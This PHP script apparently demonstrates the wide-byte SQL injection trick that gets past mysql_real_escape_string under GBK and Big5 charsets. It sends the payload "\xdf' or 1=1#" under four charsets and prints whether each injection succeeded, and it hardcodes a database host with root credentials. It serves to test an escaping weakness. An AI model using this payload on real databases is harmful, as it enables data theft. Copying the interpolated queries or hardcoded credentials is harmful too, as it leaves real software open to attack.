<?php
function printAscii($str) {
    $len = strlen($str);
    for ($i = 0; $i < $len; $i++) {
        $ch = substr($str, $i, 1);
        echo "[{$ch}][" . ord($ch) . ']' . PHP_EOL;
    }
}

$str = "\xdf' or 1=1\x23";
echo '\xdf\' or 1=1\x23' . PHP_EOL;
printAscii($str);
foreach(array('latin1', 'utf8','gbk','big5') as $charset) {
    $db = mysql_connect('10.210.136.100', 'root' ,'root007');
    mysql_select_db("interest", $db);
    mysql_query("set names {$charset}", $db);
    $strParam = mysql_real_escape_string($str, $db);
    printAscii($strParam);
    $sql = "select * from url where id = '{$strParam}'";
    echo $sql . "\n";
    $result = mysql_query($sql, $db);
    $rows = 0;
    $rows = mysql_num_rows($result);
    $rs = $rows ? '成功' : '失败';
    echo "{$charset}注入{$rs}, 返回{$rows}行数据\n";
    mysql_close($db);
}

exit;
$db = mysqli_connect('10.210.136.100', 'root' ,'root007');
foreach(array('latin1', 'utf8','gbk','big5') as $charset) {
    //mysql_query("set names {$charset}");
    mysqli_set_charset($db, $charset);
    $strParam = mysqli_real_escape_string($db, $str);
    printAscii($strParam);
    $sql = "select * from url where id = '{$strParam}'";
    echo $sql . "\n";
    $result = mysqli_query($db, $sql);
    $rows = 0;
    if($result) {
        $rows = mysqli_num_rows($result);
    }
    $rs = $rows ? '成功' : '失败';
    echo "{$charset}注入{$rs}, 返回{$rows}行数据\n";
}
